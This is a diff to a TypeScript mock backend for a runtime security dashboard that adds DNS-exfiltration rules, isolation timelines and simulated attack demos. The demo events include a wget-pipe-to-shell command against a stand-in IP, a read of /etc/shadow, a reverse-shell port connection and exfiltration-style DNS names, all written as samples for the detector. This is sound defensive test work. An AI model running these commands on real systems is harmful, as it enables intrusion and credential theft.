@@ -7,6 +7,9 @@ import type {
   Change,
   DecisionEffect,
   DecisionPreview,
+  DemoRun,
+  DemoScenario,
+  DemoState,
   Event,
   Evidence,
   Info,
@@ -21,6 +24,7 @@ import type {
   Rule,
   Stats,
   Summary,
+  Timeline,
   Verdict,
   WsMessage,
 } from '../src/lib/types';
@@ -43,6 +47,52 @@ function ev(now: number, sec: number, container: string, image: string, e: Parti
 const kill = (event: Event, ruleId: string, reason: string): Verdict => ({ event, matched: true, ruleId, action: 'kill', reason, enforced: true });
 const alert = (event: Event, ruleId: string, reason: string): Verdict => ({ event, matched: true, ruleId, action: 'alert', reason });
 const ok = (event: Event): Verdict => ({ event, matched: false });
+
+// ── 10/30 DNS 질의 규칙(kind: dns) · 격리 타임라인 · 시연 — 계약 contract-1030 §1 · §2 · §3 ──
+// 48자 hex 라벨(유출 흉내) — deploy/demo scn_dns_exfil 과 같은 이름
+export const DNS_EXFIL_NAME = `${'deadbeef'.repeat(6)}.exfil.example`;
+// dns 이벤트: dstHost = 질의 이름, qtype = 대문자, dstIp · dstPort 는 컨테이너 네임서버(dnsTraced 는 넣지 않는다)
+export function dnsEvent(now: number, sec: number, container: string, image: string, name: string, qtype = 'A', comm = 'python3'): Event {
+  return ev(now, sec, container, image, { kind: 'dns', comm, dstHost: name, qtype, dstIp: '127.0.0.11', dstPort: 53 });
+}
+// WS 로 보낼 dns 판정 — 기본은 runtime-dns-exfil 경고(긴 라벨)
+export function dnsVerdict(container: string, o: { name?: string; qtype?: string; ruleId?: string; action?: 'alert' | 'kill'; reason?: string; dryRun?: boolean } = {}): Verdict {
+  const name = o.name ?? DNS_EXFIL_NAME;
+  const qtype = o.qtype ?? 'A';
+  const e = dnsEvent(Date.now(), 0, container, 'demo/x:1', name, qtype);
+  const reason = o.reason ?? (qtype === 'TXT' ? `금지 질의 유형: ${qtype} — ${name}` : `긴 DNS 라벨(유출 의심): ${name} (라벨 48자 > 40)`);
+  if (o.action === 'kill') return { ...kill(e, o.ruleId ?? 'sandbox-dns', reason), enforced: !o.dryRun, dryRun: !!o.dryRun };
+  return alert(e, o.ruleId ?? 'runtime-dns-exfil', reason);
+}
+// 기본 정책 끝에 더해지는 dns 규칙 2개(계약 §1 기본 정책 그대로)
+export function dnsRules(): Rule[] {
+  return [
+    { id: 'runtime-dns-exfil', description: 'DNS 질의로 데이터를 실어 보내는 패턴(긴 라벨 · 긴 이름 · TXT 질의). 런타임은 경고만', kind: 'dns', action: 'alert', maxLabelLength: 40, maxNameLength: 120, denyQtypes: ['TXT'] },
+    {
+      id: 'sandbox-dns', description: '설치 샌드박스는 패키지 레지스트리·GitHub 외 도메인 질의 자체를 격리 (연결 전 유출 · DNS 터널링 차단). sg-vm 실측 전까지 시험 운영',
+      kind: 'dns', action: 'kill', dryRun: true, containers: ['sg-install-*'],
+      allowHosts: ['pypi.org', 'pythonhosted.org', 'registry.npmjs.org', 'registry.yarnpkg.com', 'crates.io', 'static.crates.io', 'github.com', 'githubusercontent.com', 'deb.debian.org', 'dl-cdn.alpinelinux.org'],
+      maxLabelLength: 40,
+    },
+  ];
+}
+// 격리 타임라인(계약 §3) — 탐지 기준 ms 오프셋. 키를 null 로 주면 뺀다(없는 구간 「—」 재현)
+export const TL = { matchMs: 12, evidenceStartMs: 15, evidenceDoneMs: 310, killMs: 420, notifyMs: 431 };
+export function timeline(detectedAt: number, o: Partial<{ matchMs: number; evidenceStartMs: number | null; evidenceDoneMs: number | null; killMs: number | null; notifyMs: number | null }> = {}): Timeline {
+  const at = (ms: number) => new Date(detectedAt + ms).toISOString();
+  const v = { ...TL, ...o };
+  const t: Timeline = { detectedAt: at(0), matchedAt: at(v.matchMs) };
+  if (v.evidenceStartMs != null) t.evidenceStartedAt = at(v.evidenceStartMs);
+  if (v.evidenceDoneMs != null) t.evidenceDoneAt = at(v.evidenceDoneMs);
+  if (v.killMs != null) t.killedAt = at(v.killMs);
+  if (v.notifyMs != null) t.notifiedAt = at(v.notifyMs);
+  return t;
+}
+export const DEMO_SCENARIOS: DemoScenario[] = ['all', 'shell', 'revshell', 'direct-ip', 'domain', 'dns-exfil'];
+// Run 객체(계약 §2) — unix 초 기준 id · 컨테이너 이름
+export function demoRun(scenario: DemoScenario, installId: string, unix = Math.floor(Date.now() / 1000)): DemoRun {
+  return { id: `demo-${unix}`, scenario, container: `sg-install-demo-${unix}`, installId, startedAt: new Date(unix * 1000).toISOString(), finishedAt: null, status: 'running', exitCode: null, simulated: true };
+}
 // SSE 본문: 시작 주석 · 중간 ping 주석을 섞는다(백엔드 api/chat.go 와 같은 모양)
 export const sseBody = (events: [string, unknown][]) =>
   ': start\n\n' + events.map(([e, d], i) => (i === 1 ? ': ping\n\n' : '') + `event: ${e}\ndata: ${JSON.stringify(d)}\n\n`).join('');
@@ -84,6 +134,14 @@ export class MockBackend {
   // W19: 실시간 끊김 재현 — wsRefuse 동안 새 연결을 바로 닫고, dropWs() 는 지금 연결을 끊는다. failing: 경로 → 상태 코드(최초 로드 실패 재현)
   wsRefuse = false;
   failing = new Map<string, number>();
+  // 10/30 시연(계약 §2 mock 소스): info.demo 가 true 일 때만 /api/demo 경로가 있다. demoDown → 503, demoRefused → 거부 세션(202 refused)
+  demo: DemoState = { enabled: false, scenarios: DEMO_SCENARIOS, running: null, last: null };
+  demoDown = false;
+  demoRefused = false;
+  demoStepMs = 250; // 모의 재생 간격
+  private demoTimers: number[] = [];
+  // 10/30: 수집량에 dns 를 넣을지(enableDns) — 기본은 옛 백엔드처럼 없음
+  dnsCollected = false;
   dropWs() {
     void this.ws?.close({ code: 1006, reason: 'drop' });
   }
@@ -110,7 +168,7 @@ export class MockBackend {
   recent: Verdict[];
   stats: Stats;
   // 종합(10/16): 1분 단위 수집량 — 최근 26시간, 결정적인 값
-  collected: { minute: number; exec: number; open: number; connect: number }[] = [];
+  collected: { minute: number; exec: number; open: number; connect: number; dns?: number }[] = [];
   osv: Record<string, number> = { 'PyPI:reqeusts': 0, 'PyPI:requests': 16, 'npm:tiny-git-dep': 0, 'PyPI:colourama': 0 };
 
   constructor() {
@@ -260,6 +318,155 @@ export class MockBackend {
   case(id: string) {
     return this.cases.find((c) => c.id === id)!;
   }
+  // 10/30: dns 규칙 2개 + dns 이벤트(런타임 경고 2 · 설치 ins-0012 의 sandbox-dns 격리 대상 1) + 활동 요약 「조회」 + 수집량 dns
+  enableDns() {
+    const now = this.now;
+    this.rules.push(...dnsRules());
+    const RT = 'pkg-reqeusts';
+    const RTIMG = 'demo/reqeusts:1.0.2';
+    const rt: Verdict[] = [
+      alert(dnsEvent(now, 57, RT, RTIMG, DNS_EXFIL_NAME, 'A'), 'runtime-dns-exfil', `긴 DNS 라벨(유출 의심): ${DNS_EXFIL_NAME} (라벨 48자 > 40)`),
+      alert(dnsEvent(now, 57, RT, RTIMG, 'data.exfil.example', 'TXT'), 'runtime-dns-exfil', '금지 질의 유형: TXT — data.exfil.example'),
+    ];
+    this.recent.unshift(...rt);
+    const top = Math.max(0, ...this.audit.map((a) => a.id));
+    this.audit.unshift(...rt.map((v, i) => ({ ...v, id: top + 2 - i, caseId: 'case-0005', install: null })));
+    const c5 = this.cases.find((c) => c.id === 'case-0005');
+    if (c5) {
+      c5.violations += 2;
+      c5.ruleIds = [...c5.ruleIds, 'runtime-dns-exfil'];
+    }
+    const s = this.installs.find((x) => x.id === 'ins-0012');
+    if (s) {
+      const v: InstallViolation = { ...kill(dnsEvent(now, 609, s.container, PYIMG, 'cdn.reqeusts-update.test', 'A'), 'sandbox-dns', '허용 목록 밖 도메인 질의: cdn.reqeusts-update.test (A)'), enforced: false, dryRun: true, count: 1 };
+      s.violations = [...(s.violations ?? []), v];
+      if (s.activity) s.activity.kinds = { ...s.activity.kinds, dns: 4 };
+      const c4 = this.cases.find((c) => c.id === 'case-0004');
+      if (c4) {
+        c4.violations += 1;
+        c4.ruleIds = [...c4.ruleIds, 'sandbox-dns'];
+      }
+      this.audit.unshift({ ...v, caseId: 'case-0004', install: { id: 'ins-0012', label: 'pip ./reqeusts' }, id: top + 3 });
+      this.audit.sort((a, b) => b.id - a.id);
+    }
+    this.dnsCollected = true;
+    for (const c of this.collected) c.dns = 1 + (c.minute % 2);
+    return this;
+  }
+  // 10/30: 격리 타임라인 — ins-0012(설치) · case-0005(런타임)의 첫 kill 판정 + 그 감사 행. 설치 쪽은 알림 구간 없음(「—」 재현)
+  enableIsolation() {
+    const s = this.installs.find((x) => x.id === 'ins-0012');
+    const first = s?.violations?.[0];
+    if (s && first) {
+      const tl = timeline(Date.parse(first.event.timestamp), { notifyMs: null });
+      first.timeline = tl;
+      const row = this.audit.find((a) => a.caseId === 'case-0004' && a.ruleId === first.ruleId);
+      if (row) row.timeline = tl;
+      s.isolation = { auditId: row?.id ?? 0, timeline: tl };
+    }
+    const c5 = this.cases.find((c) => c.id === 'case-0005');
+    const row5 = this.audit.filter((a) => a.caseId === 'case-0005' && a.action === 'kill').sort((a, b) => a.event.timestamp.localeCompare(b.event.timestamp))[0];
+    if (c5 && row5) {
+      row5.timeline = timeline(Date.parse(row5.event.timestamp), { killMs: 380, notifyMs: 390 });
+      c5.isolation = { auditId: row5.id, timeline: row5.timeline };
+    }
+    const r = this.recent.find((v) => v.event.containerName === 'pkg-reqeusts' && v.action === 'kill');
+    if (r && row5?.timeline) r.timeline = row5.timeline;
+    return this;
+  }
+  // 10/30: 시연 켜기(/api/info.demo = true + /api/demo 경로)
+  enableDemo() {
+    this.info.demo = true;
+    this.demo.enabled = true;
+    return this;
+  }
+  // 시연 모의 재생(계약 §2 mock 소스): 세션 → 정상 이벤트 → 시나리오 이벤트 순서대로, 첫 kill 판정에서 멈춘다
+  private startDemo(run: DemoRun) {
+    const ctr = run.container;
+    const at = (ms = 0) => new Date(Date.now() + ms).toISOString();
+    const session: InstallSession = {
+      id: run.installId, manager: 'pip', packages: ['./reqeusts'], container: ctr, containerId: `${run.installId}abcdef0123456789`, image: PYIMG,
+      startedAt: run.startedAt, finishedAt: null, exitCode: null, status: 'running', caseId: null, refusedBy: null, violations: [],
+      activity: { kinds: {}, hosts: [], programs: [] },
+    };
+    this.installs.unshift(session);
+    const e = (x: Partial<Event> & Pick<Event, 'kind' | 'comm'>) => ev(Date.now(), 0, ctr, PYIMG, x);
+    const V: Record<DemoScenario, (() => Verdict)[]> = {
+      shell: [
+        () => kill(e({ kind: 'exec', comm: 'sh', args: 'sh -c wget -qO- http://203.0.113.7/p.sh | sh' }), 'pipe-to-shell', '파이프로 셸 실행'),
+        () => kill(e({ kind: 'open', comm: 'python3', path: '/etc/shadow' }), 'sandbox-secrets', '설치 중 비밀 파일'),
+      ],
+      revshell: [() => kill(e({ kind: 'connect', comm: 'python3', dstIp: '203.0.113.7', dstPort: 4444 }), 'reverse-shell-ports', '리버스 셸 포트 4444')],
+      'direct-ip': [() => kill(e({ kind: 'connect', comm: 'python3', dstIp: '203.0.113.7', dstPort: 443 }), 'sandbox-egress', '설치 중 외부 통신')],
+      domain: [
+        () => ({ ...kill(e({ kind: 'dns', comm: 'python3', dstHost: 'example.com', qtype: 'A', dstIp: '127.0.0.11', dstPort: 53 }), 'sandbox-dns', '허용 목록 밖 도메인 질의: example.com (A)'), enforced: false, dryRun: true }),
+        () => kill(e({ kind: 'connect', comm: 'python3', dstIp: '93.184.216.34', dstPort: 443, dstHost: 'example.com' }), 'sandbox-egress', '설치 중 외부 통신'),
+      ],
+      'dns-exfil': [
+        () => alert(e({ kind: 'dns', comm: 'python3', dstHost: DNS_EXFIL_NAME, qtype: 'A', dstIp: '127.0.0.11', dstPort: 53 }), 'runtime-dns-exfil', `긴 DNS 라벨(유출 의심): ${DNS_EXFIL_NAME} (라벨 48자 > 40)`),
+        () => alert(e({ kind: 'dns', comm: 'python3', dstHost: 'data.exfil.example', qtype: 'TXT', dstIp: '127.0.0.11', dstPort: 53 }), 'runtime-dns-exfil', '금지 질의 유형: TXT — data.exfil.example'),
+      ],
+      all: [],
+    };
+    V.all = [...V.shell, ...V.revshell, ...V['direct-ip'], ...V.domain, ...V['dns-exfil']];
+    const steps: (() => void)[] = [];
+    // ② 정상 이벤트 1건(설치 시작)
+    steps.push(() => {
+      const v = ok(e({ kind: 'exec', comm: 'pip', args: 'pip install --no-cache-dir --progress-bar off /pkg/reqeusts' }));
+      session.activity!.kinds.exec = (session.activity!.kinds.exec ?? 0) + 1;
+      session.activity!.programs.push({ comm: 'pip', args: v.event.args!, count: 1, level: 'normal' });
+      this.recent.unshift(v);
+      this.send({ type: 'verdict', data: v });
+    });
+    let stopped = false;
+    const finish = (status: InstallSession['status'], exitCode: number) => {
+      session.status = status;
+      session.exitCode = exitCode;
+      session.finishedAt = at();
+      run.status = 'finished';
+      run.exitCode = exitCode;
+      run.finishedAt = session.finishedAt;
+      this.demo.last = run;
+      this.demo.running = null;
+      if (status !== 'passed') {
+        const n = ++this.seq;
+        const level = status === 'isolated' ? 'killed' : 'alert';
+        const c: Case = {
+          id: `case-${String(n).padStart(4, '0')}`, source: 'install', installId: session.id, container: ctr, label: 'pip ./reqeusts', image: PYIMG, package: 'pip:reqeusts',
+          openedAt: at(), level, violations: session.violations!.reduce((k, v) => k + v.count, 0), ruleIds: [...new Set(session.violations!.map((v) => v.ruleId!))],
+          state: 'open', decision: 'pending', decidedAt: null, decidedBy: null, note: '', proposalId: null, closedAt: null, isolation: session.isolation ?? null,
+        };
+        session.caseId = c.id;
+        this.cases.unshift(c);
+        for (const a of this.audit) if (a.event.containerName === ctr) a.caseId = c.id;
+        this.send({ type: 'case', data: { ...c } });
+      }
+    };
+    for (const mk of V[run.scenario]) {
+      steps.push(() => {
+        if (stopped) return;
+        const v = mk();
+        if (v.enforced) v.timeline = timeline(Date.parse(v.event.timestamp));
+        const k = v.event.kind;
+        session.activity!.kinds[k] = (session.activity!.kinds[k] ?? 0) + 1;
+        const iv: InstallViolation = { ...v, count: 1 };
+        session.violations!.push(iv);
+        const top = Math.max(0, ...this.audit.map((a) => a.id)) + 1;
+        this.audit.unshift({ ...v, id: top, caseId: null, install: { id: session.id, label: 'pip ./reqeusts' } });
+        this.recent.unshift(v);
+        this.send({ type: 'verdict', data: v });
+        if (v.enforced) {
+          stopped = true;
+          session.isolation = { auditId: top, timeline: v.timeline! };
+          finish('isolated', 137);
+        }
+      });
+    }
+    steps.push(() => {
+      if (!stopped) finish(session.violations!.length ? 'warned' : 'passed', 0);
+    });
+    steps.forEach((fn, i) => this.demoTimers.push(setTimeout(fn, this.demoStepMs * (i + 1)) as unknown as number));
+  }
   // W16: 앱은 로그인 확인(/api/auth/me) 뒤에 실시간 연결을 연다 — 그 전에 보낸 메시지는 연결되면 보낸다
   private pending: string[] = [];
   send(msg: WsMessage) {
@@ -356,6 +563,32 @@ export class MockBackend {
       return json({ queued: n.channels.length }, 202);
     }
     let m: RegExpMatchArray | null;
+
+    // 10/30 시연 실행 API(계약 §2) — DEMO_ENABLED 가 아니면 경로 자체가 없다(404 텍스트)
+    if (path === '/demo' || path === '/demo/run') {
+      if (!this.info.demo) return route.fulfill({ status: 404, contentType: 'text/plain', body: '404 page not found' });
+      if (method === 'GET' && path === '/demo') return json({ enabled: true, scenarios: DEMO_SCENARIOS, running: this.demo.running, last: this.demo.last } satisfies DemoState);
+      if (method === 'POST' && path === '/demo/run') {
+        const { scenario } = JSON.parse(body || '{}') as { scenario?: DemoScenario };
+        if (!scenario || !DEMO_SCENARIOS.includes(scenario)) return fail(400, 'scenario: all | shell | revshell | direct-ip | domain | dns-exfil');
+        if (this.demo.running) return json({ error: '시연이 이미 실행 중입니다', running: this.demo.running }, 409);
+        if (this.demoDown) return fail(503, 'Docker 에 연결할 수 없습니다');
+        const n = ++this.seq;
+        const run = demoRun(scenario, `ins-${String(n).padStart(4, '0')}`, Math.floor(Date.now() / 1000) + n);
+        this.addChange('demo_run', `시연 실행: ${scenario}`);
+        if (this.demoRefused) {
+          // 차단 목록에 pip:reqeusts 가 있으면 sg-install 처럼 설치 전 거부 세션
+          run.status = 'refused';
+          run.finishedAt = run.startedAt;
+          this.installs.unshift({ id: run.installId, manager: 'pip', packages: ['./reqeusts'], container: '', image: PYIMG, startedAt: run.startedAt, finishedAt: run.startedAt, status: 'refused', refusedBy: { list: 'packages', value: 'pip:reqeusts' }, caseId: null });
+          this.demo.last = run;
+          return json(run, 202);
+        }
+        this.demo.running = run;
+        this.startDemo(run);
+        return json(run, 202);
+      }
+    }
 
     // 기존 API
     if (method === 'GET' && path === '/info') return json(this.info);
@@ -565,17 +798,26 @@ export class MockBackend {
     const stepMs = step * 1000;
     const end = Math.floor(Date.now() / stepMs) * stepMs + stepMs;
     const from = end - n * stepMs;
-    const series = Array.from({ length: n }, (_, i) => ({ t: new Date(from + i * stepMs).toISOString(), exec: 0, open: 0, connect: 0, killed: 0, alert: 0 }));
+    // 10/30: dns 는 enableDns() 일 때만(옛 백엔드처럼 키 자체가 없는 응답도 화면이 받아야 한다)
+    const series: Summary['series'] = Array.from({ length: n }, (_, i) => ({ t: new Date(from + i * stepMs).toISOString(), exec: 0, open: 0, connect: 0, ...(this.dnsCollected ? { dns: 0 } : {}), killed: 0, alert: 0 }));
     const at = (ms: number) => (ms >= from && ms < end ? series[Math.floor((ms - from) / stepMs)] : undefined);
-    const byKind = { exec: 0, open: 0, connect: 0 };
+    const byKind: Summary['collected']['byKind'] = { exec: 0, open: 0, connect: 0, ...(this.dnsCollected ? { dns: 0 } : {}) };
+    const kinds = this.dnsCollected ? (['exec', 'open', 'connect', 'dns'] as const) : (['exec', 'open', 'connect'] as const);
     for (const c of this.collected) {
       const b = at(c.minute * 60000);
       if (!b) continue;
-      for (const k of ['exec', 'open', 'connect'] as const) {
-        b[k] += c[k];
-        byKind[k] += c[k];
+      for (const k of kinds) {
+        b[k] = (b[k] ?? 0) + (c[k] ?? 0);
+        byKind[k] = (byKind[k] ?? 0) + (c[k] ?? 0);
       }
     }
+    // 격리 지연(계약 §3): 범위 안 killedAt 있는 행, ms = killedAt − detectedAt
+    const lat = this.audit
+      .filter((a) => a.timeline?.killedAt && Date.parse(a.event.timestamp) >= from && Date.parse(a.event.timestamp) < end)
+      .map((a) => Date.parse(a.timeline!.killedAt!) - Date.parse(a.timeline!.detectedAt))
+      .sort((x, y) => x - y);
+    const q = (p: number) => (lat.length ? lat[Math.min(lat.length - 1, Math.floor(p * lat.length))] : null);
+    const isolation = { count: lat.length, medianMs: lat.length ? lat[Math.floor((lat.length - 1) / 2)] : null, p95Ms: q(0.95), maxMs: lat.length ? lat[lat.length - 1] : null };
     const vio = { total: 0, killed: 0, alert: 0, held: 0 };
     const isolated = new Set<string>();
     const tops = { rules: new Map<string, { count: number; level: Level }>(), ctrs: new Map<string, { count: number; level: Level }>() };
@@ -610,7 +852,7 @@ export class MockBackend {
       from: new Date(from).toISOString(),
       to: new Date(end).toISOString(),
       bucketSec: step,
-      collected: { total: byKind.exec + byKind.open + byKind.connect, byKind },
+      collected: { total: byKind.exec + byKind.open + byKind.connect + (byKind.dns ?? 0), byKind },
       violations: vio,
       isolatedContainers: isolated.size,
       series,
@@ -619,6 +861,7 @@ export class MockBackend {
       installs: { total: ins.length, passed: st('passed'), isolated: st('isolated'), warned: st('warned'), refused: st('refused'), failed: st('failed') + st('unknown'), running: st('running') },
       decisions: { malicious: dec.filter((c) => c.decision === 'malicious').length, falsePositive: dec.filter((c) => c.decision === 'false_positive').length, pending: this.cases.filter((c) => c.state === 'open').length },
       blocklist: { packages: this.blocklist.packages.length, images: this.blocklist.images.length, hosts: this.blocklist.hosts.length },
+      isolation,
     };
   }
 
@@ -680,8 +923,9 @@ export class MockBackend {
       if (c.source === 'install' || c.source === 'scan') add({ op: 'block', list: 'packages', value: c.package! });
       else add({ op: 'block', list: 'images', value: c.image });
       for (const v of vs) {
-        const host = v.event.kind === 'connect' ? v.event.dstHost : undefined;
-        if (v.event.kind !== 'connect') continue;
+        // 10/30: dns 질의도 질의 이름(dstHost)을 도메인 차단 후보로
+        const host = v.event.kind === 'connect' || v.event.kind === 'dns' ? v.event.dstHost : undefined;
+        if (v.event.kind !== 'connect' && v.event.kind !== 'dns') continue;
         if (!host) {
           note(`${v.event.dstIp} 은 도메인을 몰라 도메인 차단을 만들지 않았습니다`);
           continue;
@@ -702,6 +946,9 @@ export class MockBackend {
         else if (v.event.kind === 'connect' && (rule?.denyPorts?.includes(v.event.dstPort ?? -1) || rule?.denyHosts?.some((h) => v.event.dstHost && hostMatches(h, v.event.dstHost))))
           note(`규칙 ${v.ruleId} 은 금지 목록에 걸려 예외로 풀 수 없습니다 — 정책 탭에서 직접 수정하세요`);
         else if (v.event.kind === 'open' && v.event.path) add({ op: 'except', ruleId: v.ruleId, field: 'allowPaths', value: v.event.path });
+        // 10/30: dns 규칙은 허용 도메인 목록이 있을 때만 예외(없는 규칙에 첫 allowHosts 를 넣으면 허용 목록 모드로 바뀐다)
+        else if (v.event.kind === 'dns' && v.event.dstHost && hadHosts.has(v.ruleId)) add({ op: 'except', ruleId: v.ruleId, field: 'allowHosts', value: v.event.dstHost });
+        else if (v.event.kind === 'dns') note(`규칙 ${v.ruleId} 은 허용 도메인 목록이 없어 자동 예외를 만들지 않습니다 — 정책 탭에서 직접 수정하세요`);
         else if (v.event.kind === 'connect' && v.event.dstHost && hadHosts.has(v.ruleId)) add({ op: 'except', ruleId: v.ruleId, field: 'allowHosts', value: v.event.dstHost });
         else if (v.event.kind === 'connect') add({ op: 'except', ruleId: v.ruleId, field: 'allowCidrs', value: `${v.event.dstIp}/32` });
       }
